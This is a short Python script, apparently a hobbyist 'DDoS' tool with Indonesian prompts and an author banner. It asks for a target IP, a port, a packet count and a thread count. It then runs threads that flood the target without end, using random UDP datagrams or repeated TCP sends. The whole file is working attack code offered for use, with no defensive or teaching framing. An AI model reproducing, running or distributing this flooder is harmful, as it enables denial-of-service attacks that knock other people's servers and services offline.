#!/usr/bin/env python3
#[>=========== Predator ArthurXzz ============]
#>>>>>>-------- Xyz Predator ArthurXzz --------<<<<<<<
import random
import socket
import threading
import os
import time
import sys

os.system("clear")
print("""\u001b[31m 
======>>> FOLLOW MY GITHUB <<<======
============>>>> Discord.gg//Xyz-Arthur <<<<=============
--------------=+++++= Author : ArthurXzz Xyz =+++++=--------------
========= [  SUDAH MENYIAPKAN PERMEN ] ========== """)
                
os.system("clear")
print(" ====== Masukan IP Server Target ======")
ip = str(input(" Masukan Cede IP Target: "))
print(" ====== Masukan Port Server Target ======= ")
port = int(input(" Masukan Code Port Target: "))
print(" ====== Apakah Anda Sudah Menyiapkan Permen ====== ")
choice = str(input(" Apakah Anda Sudah Menyiapkan Permen?(y/n): "))
print(" ====== Masukan Jumlah Paket Nuklir ====== ")
times = int(input(" Masukan Jumlah Packets Nuklir: "))
print(" ====== Masukan Jumlah Kecepatan Nuklir ====== ")
threads = int(input(" Masukan Jumlah Threads Nuklir: "))
def run():
  data = random._urandom(1038)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" | [ ======= MENGIR VIRUS DARI MARS ======= ] |")
    except:
      print("[+] | [ ======= MENGIRIM VIRUS DARI MARS ======= ] |")

def run2():
  data = random._urandom(16)
  i = random.choice(("[+]","[+]","[+]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" [ GXZ NIH BOSS ARTHURXZZ ]")
    except:
      s.close()
      print("[+] [ ======= TARGET MATI KENA VIRUS =======] ")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
